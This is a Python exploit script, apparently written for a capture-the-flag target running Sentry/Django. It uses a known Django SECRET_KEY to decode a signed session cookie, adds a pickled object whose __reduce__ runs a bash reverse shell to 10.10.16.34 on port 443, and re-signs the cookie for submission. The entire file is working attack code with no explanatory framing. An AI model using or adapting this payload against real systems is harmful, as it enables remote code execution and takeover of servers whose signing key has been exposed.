#!/usr/bin/python3
import django.core.signing, django.contrib.sessions.serializers
import os
from django.conf import settings

SECRET_KEY='55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b'
settings.configure(SECRET_KEY=SECRET_KEY)
#Initial cookie I had on sentry when trying to reset a password
cookie='.eJxNjMtKxDAYhWcELwMjggufQTehSdPpZCfuBd-gJOlfk5lpArngSvABsvx9XztVoWf3ne9wvi6_H9arOZ_4WDYfNpruZGPCssKynVH77BIENBdlo2VIv36i7UwLfdvJnEyXI4TO9ljWDMv9olNSH8FN4qk_SPfuifYuBavIeUL-bCSvvofTy__2bnFgZDRYnmmjBza0gtZQNZwB7JkWlVKcykFQJpt9tav10LR6R5ViqgJWc-BUq7bmWggsN-c7J0fAcp1jlsF6LFcxyZTjVL0FGG0eMZMf061nrw:1tw8DZ:ZpNBpBvhs5PmvKjo5niRSvFNC2Z52C8s3Uwp7prEV0U'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("/bin/bash -c '/bin/bash -i >&/dev/tcp/10.10.16.34/443 0>&1'",))
newContent['testcookie'] = PickleRce()

print(django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True))
